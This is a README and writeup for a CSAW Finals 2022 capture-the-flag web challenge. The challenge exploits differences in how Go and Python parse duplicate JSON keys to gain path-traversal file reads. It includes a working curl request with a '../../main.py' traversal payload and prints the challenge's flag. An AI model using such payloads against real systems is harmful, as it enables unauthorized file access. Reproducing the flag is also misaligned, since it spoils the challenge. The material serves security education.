# homeworkme
A vulnerable web app involving JSON interoperability and LFI developed for CSAW Finals 2022

Homework files are stored in `/service/files` and are sorted by hard-coded subjects. Files inside the subjects will automatically be detected by the service.



## writeup
Source is provided, vulnerability involves sending in a duplicate key as the Golang `jsonparser` and Python default JSON library interprets it differently
- Python last key precedence
- Golang jsonparser first key precendence

Send the following:
```bash
curl -X POST -d '{"filename": "[EXISTING FILE]", "filename": "../../main.py", "subject": "math"}' http://localhost:1234/homework
```

Flag is in the comment of `main.py`


flag{bro_can_i_use_your_chegg}

## references
- https://github.com/BishopFox/json-interop-vuln-labs
- https://bishopfox.com/blog/json-interoperability-vulnerabilities

- history answer key from https://notgrass.com/content/exploring_world_history_answer_key.pdf
- math homework generated from https://lewdev.github.io/apps/hw-gen/
- science homework from https://www.easyteacherworksheets.com
